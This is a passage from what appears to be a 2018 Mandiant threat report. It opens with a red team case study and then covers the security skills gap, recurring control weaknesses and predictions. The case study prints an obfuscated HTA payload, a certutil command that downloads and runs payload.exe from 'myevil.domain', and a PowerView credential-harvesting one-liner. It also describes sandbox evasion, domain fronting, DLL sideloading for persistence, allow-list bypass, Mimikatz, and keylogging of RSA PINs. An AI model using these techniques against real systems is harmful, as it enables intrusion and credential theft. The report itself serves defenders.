t,e=[],n=0,a=””,f=0;f<256;f++)e[f]=f;for(f=0;f<256;f++)\n\nn=(n+e[f]+r.charCodeAt(f%r.length))%256,t=e[f],e[f]=e[n],e[n]=t;f=0,n=0;for(var h=0;h<o.\n\nlength;h++)n=(n+e[f=(f+1)%256])%256,t=e[f],e[f]=e[n],e[n]=t,a+=String.fromCharCode\n\n(o.charCodeAt(h)^e[(e[f]+e[n])%256]);return a}\nvar HYvtwtnj = function(){return “1.2.3.4”};\nvar ZRETMvTj = “BFcTWpEviGQFt7jTLl9yU/D3W1gubuKV2Jlsaadz+qV4ClduGq1AkiMQYhG68KLfSeQ6XvR\n\npchps2nNOsWyRnyhM2iLYvhSwa9kLUKL2bta9SF9fZAsTIOmsdk6xKH7a79WCHYs3N44IWrEj4/eA7HfvSzu6MO\n\npbJOyrCy25J639PSF1mdA2eLHXCElE+veIhZBWLhe55ffz/9m9oHLoniv8p7exo5AYFpSsxaMHF\n\nqpdUQ9jf6zyX72O/4D9tTj45q+MW6xkM9sYvTb3Tgp5oig26vZTaHqIK2lx0gkA1nwHACbg5mZZ9KRgFMuYsYZL”;\nvar zCfYcHmx = zPaLZROx(HYvtwtnj(),atob(“ekgfSg==”));\nsetTimeout(‘var WwhLHkAK = new ‘+zCfYcHmx+’([zPaLZROx(HYvtwtnj(), atob(ZRETMvTj))])’);\nvar fONcNXjJ = zPaLZROx(HYvtwtnj(),atob(“EEIFRpsrlSsH/rSYPVB0W6j8dnMbJeeVxokhIINO/\nqcxAlRwVeJOuDU3TAW12rPkEaM6ee88IANWm1wQ5kLLgXYdnGaP71DvNLRWE8G6KIPPFAANfFkPdrP7OQKSfHnc\n\nsvOLDosxcqdKDfQu8qiC/U3gXHqRJpkkbO+pBmL1Jd/zJ3AniIN5fK7SEAAWqaPHzN4aJha64/DjtMi0tnH7gGj\n\n8+ai97dkEEdah3uBfHe9bUVVwfvO8BLWy9pP5vHjooeCMEOtwIpQJozzwF11grTU18rliFFPeL\n\nTk9uQ4A9XhDBin7wFEf4O06TNjfpZ0CkM37fETAfvTDnTPT7RC4vAtnAdC268y3bEQCvox/vZSzKScPEjVVw4MF\n\nNAAJkeeHdKjH54zouxo7GrzHDmjTFU5YoATeLltJ9216tQTLF0id6q8=”));\nsetTimeout(fONcNXjJ+’(WwhLHkAK, zPaLZROx(HYvtwtnj(), atob(“SEUJRJc+mGoBorc=”)))’);\n</script>\n</body>\n</html>\n\n```\n\n-----\n\nTo avoid sandbox detection mechanisms often deployed in mature environments, sandbox evasion techniques can be\nbuilt into the payload with the obfuscation. A red team could use any number of sandbox evasion techniques including\nforcing the malware to wait or “sleep” a specified period of time before executing (Fig. 15), checking for mouse movement\nor clicks, or checking that a minimum number of processes are present for the payload to be executed. Combined with\nDemiguise, the final payload file has little to detect (Fig. 16).\n\n**Figure 15. A delayed payload execution command.**\n\n```\nroot@testbox:̴/git/demiguise#./demiguise.py -k 1.2.3.4 -c “timeout 12 &&\ncertutil -urlcache -split -f https//myevil.domain/payload payload.exe &&\n payload.exe” -o payload.hta -p Outloock.Application\n[*] Generating with key 1.2.3.4\n[*] Will execute: timeout 12 && certutil -urlcache -split -f https//myev\n\nil.domain/payload payload.exe\n[+] HTA file written to: payload.html\nroot@testbox:̴/git/demiguise#\n\n```\n\n**Figure 16. The final Demiguise payload.**\n\n```\n<html>\n<body>\n<script>\nfunction zPaLZROx(r,o){for(var t,e=[],n=0,a=””,f=0;f<256;f++)e[f]=f;for(f=0;f<256;f++)n=\n\n(n+e[f]+r.charCodeAt(f%r.length))%256,t=e[f],e[f]=e[n],e[n]=t;f=0,n=0;for(var h=0;h<o.\n\nlength;h++)n=(n+e[f=(f+1)%256])%256,t=e[f],e[f]=e[n],e[n]=t,a+=String.fromCharCode(o.charCodeAt\n\n(h)^e[(e[f]+e[n])%256]);return a}\nvar HYvtwtnj = function(){return “1.2.3.4”};\nvar ZRETMvTj = “BFcTWpEviGQFt7jTLl9yU/D3W1gubuKV2Jlsaadz+qV4ClduGq1AkiMQYhG68KLfSeQ6XvRpchps\n\n2nNOsWyRnyhM2iLYvhSwa9kLUKL2bta9SF9fZA\n\nsTIOmsdk6xKH7a79WCHYs3N44IWrEj4/eA7HfvSzu6MOpbJOyrCy25J639PSF1mdA2eLHXCElE+veIhZBWLhe55ffz/\n\n9m9oHLoniv8p7exo5AYFpSsxaMHFqpdUQ\n\n9jf6zyX72O/4D9tTj45q+MW6xkM9sYvTb3Tgp5oig26vZTaHqIK2lx0gkA1nwHACbg5mZZ9KRgFMuYsYZL”;\nvar zCfYcHmx = zPaLZROx(HYvtwtnj(),atob(“ekgfSg==”));\nsetTimeout(‘var WwhLHkAK = new ‘+zCfYcHmx+’([zPaLZROx(HYvtwtnj(), atob(ZRETMvTj))])’);\nvar fONcNXjJ = zPaLZROx(HYvtwtnj(),atob(“EEIFRpsrlSsH/rSYPVB0W6j8dnMbJeeVxokhIINO/\nqcxAlRwVeJOuDU3TAW12rPkEaM6ee88IANWm1wQ5kLLgXYdnGaP71DvNLRWE8G6KIPPFAANfFkPdrP7OQKSfHncsv\n\nOLDosxcqdKDfQu8qiC/U3gXHqRJpkkbO+pBmL1Jd/zJ3AniIN5fK7SEAAWqaPHzN4aJha64/\nDjtMi0tnH7gGj8+ai97dkEEdah3uBfHe9bUVVwfvO8BLWy9pP5vHjooeCMEOtwIpQJozzwF11grTU18rliFFPeLTk9u\n\nQ4A9XhDBin7wFEf4O06TNjfpZ0CkM37fETAfvTDnTPT7RC4vAtnAdC268y3bEQCvox/vZSzKScPEjVVw4MFNAAJkee\n\nHdKjH54zouxo7GrzHDmjTFU5YoATeLltJ9216tQTLF0id6q8=”));\nsetTimeout(fONcNXjJ+’(WwhLHkAK, zPaLZROx(HYvtwtnj(), atob(“SEUJRJc+mGoBorc=”)))’);\n</script>\n</body>\n</html>\n\n```\n\n-----\n\nThe SOC was unable to identify the CnC server using\nnetwork traffic analysis due to the use of a covert CnC\ncommunication known as domain fronting. This attack\ntechnique has been leveraged by Russian nation-state\nactors such as APT29. Originally developed as a technique\nto avoid censorship-based blocking of Internet traffic,\ndomain fronting allows an attacker to abuse HTTPS\nconnections to hide CnC activity in network traffic so\nthat it is indistinguishable from legitimate requests for\npopular websites. The true destination of the CnC activity\nis obscured through the content delivery networks (CDNs).\nThis technique leverages the HTTP “Host” header used in\nmany shared hosting environments to specify the target\nfor a specified request. This allowed Mandiant’s red team\nto hide its CnC traffic in what appeared to be legitimate\nrequests for sites hosted in the CDN. The red team used a\nconfiguration (Fig. 17) derived by following these steps:\n\n1. Create a CDN instance in the same shared hosting\n\nenvironment and configure this instance to forward\ntraffic to the red team’s malicious CnC server.\n\n2. During CnC communications, establish an SSL/TLS\n\nconnection to a well-known site that uses the same CDN.\nThere are publicly available lists of domains that can be\nused as an impersonated domain for most major CDNs.\n\n\n3. Set the “Host” header on subsequent HTTPS CnC\n\nrequests to point to the CDN instance. This will cause\nthe CDN to direct all requests to the actual domain\nrather than the impersonated domain used for the initial\nSSL/TLS connection.\n\nDomain fronting gives an attacker several advantages:\n\n- Renders detection of CnC traffic using known IP\n\naddresses or domain names ineffective.\n\n- Makes anomaly detection ineffective because the traffic\n\nis indistinguishable from other traffic destined for large\nCDNs.\n\n- Makes detection based on known bad or anomalous\n\nSSL/TLS certificates ineffective because the domain\nname and SSL/TLS certificate belong to a legitimate site\nin the CDN.\n\n- Creates challenges to remediation since blocking CnC\n\ntraffic could result in legitimate domain names or IP\naddresses being blocked.\n\n- Prevents SSL/TLS decryption techniques from being\n\nused by taking advantage of certificate pinning for SSL/\nTLS certificates.\n\n\n**Figure 17. Preferred CnC setup.**\n\nDNS request for\nwww.innocus.fronted.domain.com\n\n###### 1\n\nVi i\n\n\nFronted Domain\nwww.innocus.fronted.\ndomain.com\n\n\n-----\n\nThe red team persisted on the initial three compromised systems using a Windows Management Instrumentation (WMI)\nevent subscriber. The event subscription consisted of an event filter that acted as a trigger and an event consumer that\nexecuted the payload, in this case Symantec’s signed “symerr.exe”. The “symerr.exe” executable loads a DLL named “cclib.dll”\nfrom its current working directory, so Mandiant leveraged this functionality to load a malicious DLL (Fig. 18 and 19).\n\n**Figure 18. Persistence using symerr.exe.**\n\n```\nC:\\Program Files\\Norton Internet Security\\Engine\\22.9.0.68\\symerr.exe cclib.dll\n\n```\n\n**Figure 19. Properties of symerr.exe.**\n\n\nOnce a persistence mechanism was deployed to a\nfew systems, the red team moved quickly to escalate\nprivileges and move laterally before the initial systems\nand communications to the compromised network were\nlost. The red team looked for opportunities to escalate\nprivileges in the domain using various techniques.\nOne avenue that proved useful in this assessment was\na misconfigured “userPassword” attribute in Active\nDirectory.\n\nDepending on the Active Directory configuration, this\nattribute can be treated as either of the following:\n\n- An ordinary Unicode attribute, which can be written and\n\nread as any other Unicode attribute in directory.\n\n- A shortcut to userPassword in directory, which will allow\n\npassword change operation to be performed over LDAP.\n\n\n-----\n\nPowerView[3] has a “Get-NetUser” function that assists with automating the process of looking up this attribute in Active\nDirectory. The red team used the command (Fig. 20) to harvest credentials for several service accounts on the Active\nDirectory domain. Plaintext passwords are stored in the “userPassword” attribute in Unicode format (Fig. 21).\n\n**Figure 20. PowerView function to grab userPassword field and decode it.**\n\n```\nget-netuser -Domain <REDACTEDDOMAIN> -Filter userpassword=* | select -expandproperty\nuserpassword | %{[char][int]$_} | write-host -nonewline}; write-host\n\n```\n\n**Figure 21. Example userPassword attribute with stored Unicode password.**\n\n```\n[...]\nsamaccountname :    IN\nusncreated :    6\ndisplayname :    IN\ndescription : DO NOT DISABLE - PeopleSoft FIN account\nfor Ker\n                          beros auth. Please contact\n                          FT HR IT\nuserpassword : {112, 115, 57, 49...}\npwdlastset : 11/18/2014 12:37:22 PM\nobjectclass : {top, person, organizationalPerson,\nuser}\nuseraccountcontrol : 66048\nlastknownparent : OU=Server Accounts\nDisabled, DC=prod, DS=ad, DS=me\n                                ,DC= ,DC=com\n[...]\n\n```\n\n-----\n\nWith domain credentials, the red team was able to move\nlaterally to additional systems in the environment. At this\nstage, the red team encountered a significant number of\nservers using Device Guard with constrained language\nmode enabled and an application allow list. There are\nseveral ways to bypass Device Guard and an application\nallow list, one of which is the built-in Microsoft signed\nexecutable “MSBuild.exe”. Using signed executables\nallowed Mandiant to bypass the application allow list by\nexecuting payloads in the context of a Microsoft signed\nprocess. Using the open source script PowerLessShell,[4]\nMandiant’s red team executed PowerShell scripts and\npayloads without launching “PowerShell.exe” directly. With\nthis tool, Mandiant generated a “csproj” file containing the\npayload and copied it to a new system. Mandiant could\nthen use WMI commands to remotely execute MSBuild,\nwhich, in turn, executed the malicious “csproj” payload.\n\nMandiant used credentials from the “userPassword” field to\naccess systems containing domain administrator sessions\nand used Mimikatz to read LSASS memory and obtain\nclear text credentials for a domain administrator account.\n\nA jump server is a special-purpose\ncomputer that is hardened against attack\nand provides remote access to systems in\na different network security zone.\n\n\n**Completing the Mission**\nAt this this point the red team had domain administrator\nprivileges, but the target database server storing PII\nwas protected by jump servers that required two-factor\nauthentication (2FA).\n\nThe easiest way to bypass 2FA is not to attack the\nsolution itself, but to leverage its capabilities and a lack\nof adherence to security best practices to obtain the\nsecond factor for some number of users. Soft tokens are\neasily distributed to users, but they create additional risk\nwhen stored on local computers and network shares.\nUnfortunately, this is often the case with users and IT\nadministrators. Soft tokens are often not secured with a\npassword, or a default password is stored with the soft\ntoken that allows an attacker to import the soft token.\nOnce an attacker has imported a soft token, the process\nof identifying the workstation belonging to the user and\nkeylogging the user to obtain their PIN is straightforward.\n\nDuring the assessment, Mandiant’s red team identified\n955 soft token files as having the “stdtid” extension, which\nis the default for RSA soft token files. With RSA soft\ntokens, “otf” files containing email templates with a default\n“import password” were also found (Fig. 22). The red team\nused “stoken”[5] to brute force all the soft token files to\nsee which soft tokens could be imported with the default\npassword. In this case, the default password worked for\nmore than 500 soft tokens, including jump server and\ndatabase administrators.\n\n\n-----\n\n**Figure 22. Soft token import template.**\n\n\n-----\n\nWith user credentials and a token code, the red team was only\nmissing the corresponding PIN. The red team obtained the RSA PIN\ncodes for the jump server by installing a keystroke logger on the\nworkstations of administrators and database administrators, as is\nshown in Fig. 23.\n\n**Figure 23. Keylog showing RSA PIN.**\n\n```\n------------------------------RSA SecurID : Log In - Windows Internet Explorer ------------------------------    [TAB]\n------------------------------00004225  - RSA SecurID Token ------------------------------1  3\n------------------------------RSA SecurID : Log In - Windows Internet Explorer ------------------------------[PASTE]583585887\n\n```\n\n-----\n\nAfter obtaining all of the components to authenticate to the\njump server, the red team authenticated to the jump server,\nwhich contained a route to all database servers hosted in\nthe network segment hosting PII. Once on the jump server,\nthe red team identified 210 hosts in the SSH “known_hosts”\nfile. This provided SSH routes to 210 database servers.[6]\n\n**Figure 24. Perl script to enumerate databases at scale.**\n\n\nA script (Fig. 24) was used to connect severs and identify\ndatabases having names that would indicate they may\ncontain PII. More than a million PII records were identified in\nthe databases.\n\n\n**Becoming Better Attackers for Better Preparedness**\nMandiant’s red team is constantly learning from attackers not only to perform\nsuccessful assessments without detection, but also to help our detection teams\nkeep pace with the attackers. When new techniques are released, our red team will\nimmediately take that technique, try to weaponize it or make it better, and work\nwith our detection team to help them improve detection for that technique.\n\n\n-----\n\n## CYBER SECURITY SKILLS GAP\n###### The Invisible Risk\n\nIn the ongoing battle to secure organizations from\nmalicious actors that commit crimes through methods\nsuch as theft, destruction or data manipulation, frontline\ndefenders are a scarce resource. As the demand for skilled\npersonnel capable of meeting the challenges posed by\nthese threat actors continues to rise, the supply simply\ncannot keep pace.\n\n\n-----\n\nA growing deficit in information security personnel\nis expected to dramatically exacerbate the current\nconsiderable skills gap over the next five years. This\nassertion is supported by industry research data from\nthe National Initiative for Cybersecurity Education (NICE)\nand insights gained from Mandiant engagements\nthroughout 2017. In 2017, NICE reported that 285,000\ncyber security roles went unfilled in the U.S. alone.\nWhile the scarcity of experienced professionals can be\nfelt across the entire information security spectrum,\ntrend analysis performed over the findings of cyber\ndefense center (CDC) engagements throughout the year\nindicates that this shortage appears highly prevalent in\norganizations looking to develop or mature their incident\nresponse capabilities. The specialized skillset required\nto respond, investigate and remediate cyber threats has\nbecome highly valued and the industry is struggling to\nkeep pace with demand.\n\n**The Widening Gap**\nIn many ways, the skills gap is tied to the quantitative\nnature of these roles. While a CDC breaks free from\nthe traditional, linear SOC response process by unifying\nmultiple security and intelligence disciplines into a single\nstrategic incident response center for the organization,\npersonnel requirements at the most basic level are\n\n\ncomparable. Though the numbers tend to fluctuate based\non different industries, organization size and other factors,\nthe minimum number of personnel for an around-theclock CDC is approximately 9 to 12 full-time employees. A\ntraditional CDC structure breaks this baseline headcount\ninto incident response expertise levels, with a larger, less\nexperienced subset of the staff focused on initial detection\nand triage and more seasoned personnel performing\ninvestigation and remediation.\n\nAs a CDC matures, its need for a larger talent pool\ngrows. To maximize the cost of effectively handling\nincident response internally, the CDC should be vigilant\nin increasing the scope of its detection and response\ncapabilities throughout the organization to achieve its\nstrategic objectives. The effort to mature and develop\na more proactive security posture inevitably leads to\nincreased personnel requirements. The increased focus\non identifying and remediating risks before they cause\nharm often necessitates investment in specialized skillsets,\nincluding malware analysis, threat hunting, analytics,\nautomation and threat intelligence. The more effective\na SOC becomes, the greater its scope becomes and the\nmore responsibility it will inevitability take on.\n\n\n-----\n\n**Limitations in Visibility and Detection**\nThe ability to detect events within the organization that\ncould be indicative of a greater incident is central to an\neffective incident response capability. The single most\npervasive trend in the investigations and assessments\nthat Mandiant conducted over the prior year was a gap\nin visibility and detection. During the initial compromise\nphase, key indicators of malicious activity are often\noverlooked or mischaracterized as benign due to an\nimplicit trust that malicious activity will be flagged by\ndetection mechanisms. However, detection systems\noften miss indicators of malicious activity due to poor\nconfiguration by inadequately trained staff.\n\n\nAnother common trend is the lack of appropriate event\ninvestigation because the security analysts lack the\nexperience to identify a legitimate threat from a constant\nstream of potential indicators. Mandiant reviewed the\nincidents they responded to in 2017, to see which phases\nof the attack lifecycle provided the most evidence to\ninvestigate (Fig. 25).\n\n\n**Figure 25. Investigative evidence provided during attack lifecycle phases.**\n\n**Initial Compromise** **8%**\n\n\n**Establish Foothold**\n\n**Escalate Privileges**\n\n\n**Internal Reconnaisance**\n\n**Lateral Movement**\n\n\n**Maintain Persistence**\n\n**Complete Mission**\n\n\n**0**\n\n\n**5%** **10%** **15%** **20%**\n\n**Percentage of evidence provided**\n\n\n**22%**\n\n\n-----\n\nThe data (Fig. 25) shows a definite gap in detections\nduring the initial compromise phase of the attack lifecycle,\nwhich is one of the most critical moments when an\norganization should be able to detect and prevent threats.\nThis is often due to a combination of an overabundance\nof alerts that can overwhelm personnel and distract them\nfrom efforts to identify and respond to real threats, and a\nlack of in-house skills to quickly identify the events that are\nnoteworthy to investigate.\n\nWhile some phases of the attack lifecycle, such as internal\nreconnaisance and privilege escalation, have prevalent\nindicators that can be easily identified or even automated,\nonce an attacker has breached the walls, detection of their\nactivities becomes substantially more difficult due to ever\nevolving methods attackers have at their disposal. Events\nat these phases require a greater level of experience and\nskill to identify and investigate.\n\nMany organizations believe the personnel skillset gaps\ncan be mitigated or offset by using tools to automate\n“heavy lifting” of some tasks. However, automation can\nprovide a false sense of security if the organization relies\nentirely on these tools without providing the human\nelement to ensure they are effectively configured and to\ncatch any outliers the tools may not address. As attacks\nbecome more sophisticated, there is increasing value in\nhaving proactive threat hunting measures and skills in\nplace to address potential risks before they impact the\norganization.\n\nVisibility and detection are multi-tiered capabilities that\nrely on a chain of multiple roles. If even one link is left to\na member of the SOC who does not possess the skillset\nrequired to be effective in the role, the entire chain is\ncompromised.\n\n\n**Lack of Incident Response Expertise**\nAnother trend directly attributed to the widening skills gap\nis a lack of expertise and experience in malware analysis,\nthreat intelligence and forensics investigations, as well\nas handling major incidents. This is particularly common\nin organizations with a young, burgeoning SOC. When\nincidents arise within an organization, there are times when\nthe investigation challenge will be outside of the scope of\nexperience of the personnel responsible for mitigating the\nrisk. As niche specializations, these skills represent some of\nthe rarest and most sought after on the market.\n\nThis is a primary reason many organizations outsource\nfunctions to firms that specialize in providing these roles,\nwhether through a managed solution for long-term\nassistance or retainers with incident response firms to\nassist as the need arises.\n\n**Addressing the Skills Gap**\nWhile the shortage of skilled cyber security professionals\nis not diminishing, organizations can still mitigate their risk\nof being attacked by investing in enhancing their existing\ncapabilities and outsourcing specialized roles.\n\nEnhancement efforts can include process refinement to\nmaximize the efficiency of internal procedures, training\nfor existing personnel to increase and expand their skills,\nproactive testing of critical incident response processes\nthrough tabletop exercises, automation of overhead\nprocesses such as ticket creation that typically require\ntime and effort that could be spent on investigations\nand identifying new measures to address any gaps in the\norganization’s current capabilities.\n\n\n-----\n\n## ENDURING TRENDS\n###### in Security Fundamentals\n\n\nMandiant’s strategic security\nservices measure the maturity of\nan organization’s cyber security\nprogram across critical security\ndomains. The critical security\ndomains used to gain unauthorized\naccess to organizations are observed\nannually by Mandiant during our\nincident response investigations.\n\n\nCommon attacker TTPs were observed during incident response investigations\nand further correlated by FireEye Threat Intelligence to correspond to areas\nof weakness frequently seen by our strategic services. Six information security\ndomains were observed repeatedly:\n\n\nSecurity risk\nmanagement\n\nIdentity and access\nmanagement\n\nData\nprotection\n\n\nIncident\nresponse\n\nNetwork, cloud and data\ncenter protection\n\nHost and endpoint\nprotection\n\n\nWe also observed that while organizations are increasingly recognizing the\nimportance of operationalizing cyber threat intelligence (CTI), there are\nweaknesses in implementation.\n\nThe following examples are based on engagements delivered in 2017, where\nwe saw attackers exploit weaknesses in an organization’s detection and\nprevention controls.\n\n\n-----\n\n###### Security Risk Management Identity and Access Management\n\n\nWe have observed that many organizations do not have\nformalized threat and vulnerability management functions\nwith the authority and necessary visibility into all network\nenclaves, assets and applications, and patches and\nconfiguration changes are not applied in a consistent and\ntimely manner across the enterprise. Patch management\nand configuration infrastructure often only covers a portion\nof the assets the organizations’ environments, leaving\ngroups of assets to be independently managed, resulting in\ninconsistencies in patching and configuration hardening.\n\nThrough our incident response and cyber threat intelligence\nexperience, we see attackers leveraging unpatched\nvulnerabilities. These observations reinforce our belief in\nthe importance of having mature threat and vulnerability\nmanagement practices. In one case, an unnamed threat\nactor exploited an unpatched Apache Struts framework\nvulnerability of an organization’s externally facing\napplication server. The attacker then installed distributed\ndenial of service (DDoS) malware on the server to create a\nplatform to target other organizations.\n\nAnother example we observed APT35 (The Newscaster\nTeam) compromising at least three U.S.-based companies,\nand performing reconnaissance at two other U.S.\norganizations and one non-U.S. company. At least one\norganization was likely compromised due to the attacker\nexploiting unpatched vulnerabilities in the Ektron CMS\nplatform, which allowed them to upload web shell\nbackdoors. The attacker then leveraged publicly available\nmalware and legitimate Windows tools to dump passwords\nand exfiltrate data.\n\n\nWe continue to observe that authentication and\nauthorization controls are often not hardened against\nabuse from attackers. Two of the most common issues are\na lack of multi-factor authentication (MFA) enforcement\nand securing privileged credentials. Many organizations\ndo not have MFA implemented, or they have a true MFA\nsolution that provides the second factor “out-of-band” and\nnot generated within the user’s device. Instead, they rely on\ndevice certificate-based authentication, which is easier to\nbypass. Additionally, organizations have not hardened their\nActive Directory environments, such as by reducing the\nexposure of Windows credentials in memory, and they have\nnot adequately secured privileged credentials from misuse.\n\nAn example of an attacker exploiting single-factor\nauthentication is APT28 (Tsar Team) in their targeting of\nhotel Wi-Fi networks. The group has used noteworthy\ntechniques, including sniffing passwords from the guest\nWi-Fi network traffic, poisoning the NetBIOS Name Service,\nand spreading laterally using the ETERNALBLUE exploit. One\nincident involved a user being compromised after connecting\nto a public Wi-Fi network. Twelve hours after the victim\ninitially connected to the publicly available Wi-Fi network,\nAPT28 logged into the machine with stolen credentials. After\nsuccessfully accessing the machine, the attacker deployed\ntools on the machine, spread laterally through the victim’s\nnetwork, and accessed the victim’s OWA account.\n\nAnother example of an attacker leveraging weakness\nin authentication and authorization controls is APT10\n(Menupass Team), which typically uses credential\nharvesters to acquire privileged credentials. We observed\nthem executing tools such as Mimikatz and SysInternals\nProcDump to harvest user credentials in multiple intrusions\nwhere FireEye responded. These were invoked using\ndifferent methods, including local execution, DLL searchorder hijacking, remote execution and output through\nPsExec/WMIExec, and automated collection through\n\nt b t h i t\n\n\n-----\n\n###### Data Protection\n\nMany organizations we work with do not have well-defined\ndata classification policies and protection requirements\nfor sensitive data types. Compounding this, these same\norganizations often do not know all of the types of data\nthey possess and where they are located within the\nenterprise in structured and unstructured locations. This\ninformation is necessary to properly establish appropriate\ndetection and protection technologies and processes in\naccordance with the data sensitivity level. The upcoming\nGeneral Data Protection Regulation (GDPR) requirements\nemphasize the importance of appropriate data handling\npractices and protections more than ever, and provide the\nmechanism to penalize organizations that are not taking\nthe proper actions to protect sensitive data.\n\nIn multiple cases, Mandiant observed attackers leveraging\nminimal controls of sensitive data within the victim’s\nenvironment. Sensitive intellectual property and PII were\nnot secured with additional controls such as network\nsegmentation, MFA, encryption and restrictive Internet\negress controls. In these cases, the organizations applied\nfew minimum internal controls beyond basic single-factor\nuser authentication to applications, code repositories and\nnetwork shares. Once the attackers were on the internal\nnetwork with the proper credentials, they completed their\nmission of accessing the targeted information, staging the\ndata and exfiltrating gigabytes of sensitive information.\n\n\n###### Incident Response\n\nWe continue to see organizations struggle with\nconsolidated visibility across all enclaves of their\nenvironments. Many organizations focus their monitoring\non regulated portions of their networks (e.g., PCI, SOX)\nand have not expanded logging and monitoring efforts\nto other less-scrutinized portions. Incomplete and\ndecentralized logging of investigation-relevant sources\nhinder the detection and response capabilities of the\norganization’s information security team.\n\nIn many Mandiant incident response engagements, we\nobserved that attacker activity went unmitigated by the\norganization’s information security monitoring team and\ncapability. This is due to many factors including lack of\nauthority, lack of visibility and a lack of instrumentation.\nMandiant often observes that information security is not\na dedicated function and does not have authority across\nthe organization, but only over a portion of assets. Specific\nkey instrumentation components we see missing include a\ncentralized log aggregation capability, host and endpoint\nlogging configurations (e.g., PowerShell, Sysmon, OS and\nApplication Audit logs) and network level visibility for\nlateral movement.\n\n\n-----\n\n###### Network, Cloud, and Data Center Protection\n\nWe commonly find deficiencies in network segmentation\nand secure configuration of cloud services. When **1** Compromised several accounts through password\ncustomers do not have network segmentation properly spraying the organization’s external Active\nimplemented, detection and remediation are much Directory Federation Services (AD FS) proxy.\nmore difficult, and the resulting impact of the breach is\nsignificantly higher. Neglecting to secure cloud services, **2** Authenticated to the compromised accounts\nsuch as the Office 365 email platform, results in attackers and created a mailbox forwarding rule to forward\ngaining access to sensitive emails and data and a limited all messages to a malicious mail address under\nability for organizations to detect and investigate a breach. their control. In other instances, attackers stole\n\nExchange service credentials during on-premises\n\nMandiant observed multiple cases of attackers targeting network intrusions, then accessed the eDiscovery\nan organization’s Office 365 instances to gain access to functionality of Office 365 and ran searches\nsensitive messages. Examples of techniques observed through the platform using keywords of interest\ninclude malicious mailbox forwarding rules and abuse of to the attackers.\nthe Office 365 eDiscovery functionality. We have seen\nattackers create the malicious mailbox forwarding rules **3** Downloaded the resulting messages from the\nby doing the following: queries.\n\n\n-----\n\n###### Host and Endpoint\n Protection\n\n\nCommon areas of weakness in endpoint protection that we\nobserved in organizations are advanced malware protections,\ninvestigation capabilities and application allow lists. Many\norganizations rely on legacy signature-based protections on the\nendpoint. Coupled with that is the inability of information security\nprofessionals to conduct deep forensic analyses of malicious\nactivity across the server and end user computing environments.\nApplication allow lists are another important detection and\nprevention control we see lacking in the organizations we assess.\nWithout application allow lists, end users and attackers have the\nability to install arbitrary software in an uncontrolled manner. These\nweaknesses are commonly exploited by attackers in the initial\ncompromise and establish foothold stages of the attacker lifecycle\nin the incidents we investigate.\n\nPhishing continues to be a primary preferred method of\ncompromising organizations because of its simplicity and\neffectiveness. However, determined attackers will pivot to other\nmethods of deploying malware. As an example, in May 2017, FireEye\nThreat Intelligence observed an uptick in activity related to an\nongoing campaign distributing Emotet malware. A wide variety of\nlures and distribution methods were leveraged in this high-volume\ncampaign, including malicious Word document attachments, links\nto Word documents, and links to JavaScript files to propagate\nEmotet malware. The actor(s) behind this campaign leveraged\nmore than 300 compromised websites to host malicious Word\ndocuments and Emotet payloads.\n\nAdvanced malware protections at the email and endpoint levels\nprovide a level of mitigation to these types of attacks; however,\nattacker tactics are continuously changing. Logs and detections\nfrom these controls should be regularly monitored and investigated\nfor signs of further intrusion into the target organizations\nenvironment. Endpoint hardening such as application allow lists\nand mitigations provided by the OS vendor should be applied\nacross the organization.\n\n\n-----\n\n**Improvements**\nThroughout 2017, Mandiant also observed improvements\nin several other areas. These include increased executive\nsupport and awareness of cyber security with GDPR\ndriving improved data protection practices, as well as\nthe need for incident response retainer agreements and\nregular tabletop exercises.\n\nWe observed increased awareness of the need for cyber\nsecurity among business leaders, senior executives and\nboard members. As cyber attacks become more frequent\nand sophisticated, organizations of all sizes across every\nindustry must make cyber risk management a priority.\n\nOrganizations that fall under the GDPR regulation\nrequirements are placing greater importance on improving\ntheir handling of data protection initiatives. As a result of\nthese initiatives for compliance, PII is beginning to receive\nmore attention and protections in the form of segregation,\ntokenization/masking, encryption and more aggressive\ndata purging policies. However, many organizations are still\nin the beginning stages of preparing for the regulation.\n\nMore organizations are recognizing the need for incident\nresponse retainer agreements to increase their ability to\nquickly investigate cyber incidents and intrusions. This is\n\n\na result of a combination of an increasing number of cyber\ninsurance providers offering lower premiums to organizations\nthat show a proactive approach to cyber security, and\nincreased awareness that having an agreement in place can\ngreatly reduce the time to respond by outside investigators.\n\nMandiant observed that organizations are increasingly\nusing tabletop exercises for technical information security\nand executive leadership teams to evaluate the tools,\nprocesses and expertise their organizations use to respond\nto cyber attacks.\n\n**Reducing Risk**\nOrganizations need to continuously increase the maturity\nof their information security program and reduce their\nrisk of compromise through an approach incorporating\nlikely real-world threats and attacker TTPs. Information\nsecurity leadership should be regularly communicating\nthis message to executives using a risk-based lens. As\ncyber attacks become more frequent and sophisticated,\nexecutives, business line leaders and boards of directors\nneed to take an active role in cyber risk management and\ndata breach preparedness. By doing this, investments and\nmitigations can be placed in the areas of highest risk to\nthe organization.\n\n\n-----\n\n## PREDICTIONS\n FOR 2018\n\n\n-----\n\n**Evolving Chinese Cyber Espionage**\nFireEye assesses with high confidence the Chinese\ngovernment has generally complied with the terms of\nthe September 2015 “Obama-Xi Agreement”. Under this\nagreement, China agreed not to use state-sponsored\nhackers to steal the intellectual property of U.S.\ncompanies. FireEye’s research indicates Chinese cyber\noperations targeting the intellectual property of U.S.\ncompanies declined significantly around the signing of the\nObama-Xi Agreement. In 2013 FireEye identified a peak\nof 72 concurrent operations were carried out by Chinese\nstate-sponsored attackers. In the months leading up to\nthe signing of the Obama-Xi Agreement fewer than 30\noperations were observed, and at the time of publication,\nFireEye is tracking six or fewer. The Trump Administration\nrenewed the deal, which serves as evidence that China is\ngenerally viewed as complying with the agreement.\n\nWhile FireEye assesses that the “Obama-Xi Agreement”\nhas led to a significant decrease in Chinese governmentcontrolled cyber operations specifically stealing\nintellectual property, this does not mean China has ceased\ncyberoperations against U.S. companies. In fact, FireEye\nhas seen an increase in the number of attacks against\nU.S. companies that have resulted in the theft of business\ninformation such as bid prices, contracts, and information\nrelated to mergers and acquisitions. FireEye has also\nseen a surge in cyber espionage campaigns targeting\nbusiness-to-business services such as cloud providers,\ntelecommunications companies and law firms. Attacking\nservice providers could allow Beijing to collect intelligence\non a broad group of targets in a manner that is less likely\nto be detected.\n\n\nWe further assess China may be willing to violate the\n“Obama-Xi Agreement” on strategic imperatives when\ndiplomatic consequences can be minimized. FireEye has\nobserved groups potentially preparing operations against\nrevolutionary technologies, such as artificial intelligence\nand advanced batteries. China may be willing to risk\nupsetting the status quo to obtain the economic and\nmilitary advances these technologies could provide.\n\n**Targeting the Software Supply Chain**\nMalware authors have increasingly leveraged the trust\nbetween users and software providers. Users do 